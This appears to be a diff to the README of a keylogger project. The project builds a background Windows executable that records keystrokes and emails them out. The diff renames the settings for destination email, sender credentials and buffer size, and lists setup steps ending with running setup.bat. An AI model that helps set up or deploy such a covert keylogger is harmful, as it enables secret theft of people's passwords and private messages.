@@ -9,9 +9,9 @@ Creates an windows executable file that runs in the background and tracks the ke
 NOTE: Python 3 users may experience issues when attempting to build the executable file
 ## Setting up:
 #### 1. fill in the following in keylogger.py:
-* Destination email Address (destEmail): The email to send results to. The current email target is the source email. 
-* Source Email Information (srcEmail/srcPwd): This is the email that the result are sent from. 
-* Buffer Size (dataBufferSize): The number of characters that are collected before the email is sent.
+* Destination email Address (DEST\_EMAIL): The email to send results to. The current email target is the source email. 
+* Source Email Information (SRC\_EMAIL/SRC\_PWD): This is the email that the result are sent from. 
+* Buffer Size (DATA\_BUFFER\_SIZE): The number of characters that are collected before the email is sent.
 
 #### 2. Run **setup.bat**.
 
